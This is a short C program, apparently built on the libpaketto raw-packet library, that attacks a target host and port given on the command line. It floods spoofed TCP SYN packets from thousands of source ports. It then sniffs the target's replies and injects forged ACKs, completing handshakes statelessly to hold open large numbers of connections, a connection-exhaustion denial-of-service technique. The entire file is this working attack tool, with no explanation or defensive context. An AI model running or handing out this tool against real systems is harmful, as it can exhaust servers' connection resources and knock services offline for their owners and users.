#include <libpaketto.h>
#include <pthread.h>

struct pk_fx_conf {
   struct link *spoof_link;
   struct link *sniff_link;
   char dest[MX_B];
   int dport;
   int debug;
};

void pk_fx_flood(struct pk_fx_conf *conf);


int main(int argc, char **argv)
{
   int i, spoof;
   struct pk_fx_conf conf;
   struct frame x;
   pthread_t p_spoof;

   conf.sniff_link = pk_link_preinit(NULL);
   conf.spoof_link = pk_link_preinit(NULL);

   snprintf(conf.dest, sizeof(conf.dest), "%s", argv[1]);
   conf.spoof_link->auto_checksums = 1;

   conf.dport = atoi(argv[2]);

   pthread_create(&p_spoof, NULL, (void *)pk_fx_flood, &conf);

   while(1){
      spoof=1;
      if(!pk_sniff_getnext(conf.sniff_link)) continue;
      if(!pk_parse_layers(conf.sniff_link->packet, conf.sniff_link->pkthdr.caplen, &x, 2, DLT_EN10MB, 0)) continue;

      if(x.tcp && x.tcp->th_sport == htons(conf.dport)) {
	 pk_memswp(&x.ip->ip_src, &x.ip->ip_dst, 4);
	 pk_memswp(&x.tcp->th_sport, &x.tcp->th_dport, 2);
	 pk_memswp(&x.tcp->th_seq, &x.tcp->th_ack, 4);

	 switch(x.tcp->th_flags) {
	   case TH_SYN|TH_ACK:
	      x.tcp->th_flags =        TH_ACK;
	      x.tcp->th_ack = htonl(ntohl(x.tcp->th_ack)+1);
	      fprintf(stdout, "SENDING ACK\n");
	      /*pk_print_ip(x.ip);
	      pk_print_tcp(x.tcp, 0);*/
	      break;
	   case        TH_ACK:
	      x.tcp->th_flags =        TH_ACK;
	      fprintf(stdout, "SENDING ACK (in response to their ack!\n");
	      /*pk_print_ip(x.ip);
	      pk_print_tcp(x.tcp, 0);*/
	      break;
	   default: spoof--;
	 }

	 if(spoof) {
	    i=pk_spoof_framed(conf.spoof_link, 3, &x);
	    if(i){
	    fprintf(stdout, "Sent %i bytes, ", i);
	    pk_translate_flags(x.tcp->th_flags);
	    fprintf(stdout, "\n");
	    }
	 }
      }
   }
}

void pk_fx_flood(struct pk_fx_conf *conf)
{
   int i, sent;
   struct frame *scanx;

   int per_quanta = 50;
   int quanta = 20000;
   int count = 0;

   sent=0;

   scanx = pk_build_generic_syn(NULL);

   pk_lookupdev_ip(conf->spoof_link->dev, &scanx->ip->ip_src);
   scanx->ip->ip_src.s_addr = htonl(scanx->ip->ip_src.s_addr);
   inet_aton(conf->dest, &scanx->ip->ip_dst);
   scanx->tcp->th_dport = htons(conf->dport);

   for(i=20000; i<60000; i++)
   {
      if(count==per_quanta) usleep(quanta);
      else count++;
      scanx->tcp->th_sport = htons(i);
      sent += (pk_spoof_framed(conf->spoof_link, 3, scanx)?1:0);
      fprintf(stdout, "SENDING SYN\n");
      //pk_print_ip(scanx->ip);
      //pk_print_tcp(scanx->tcp, 0);
      //

      usleep(10000);
   }
   fprintf(stdout, "sent %i packets\n", sent);
}

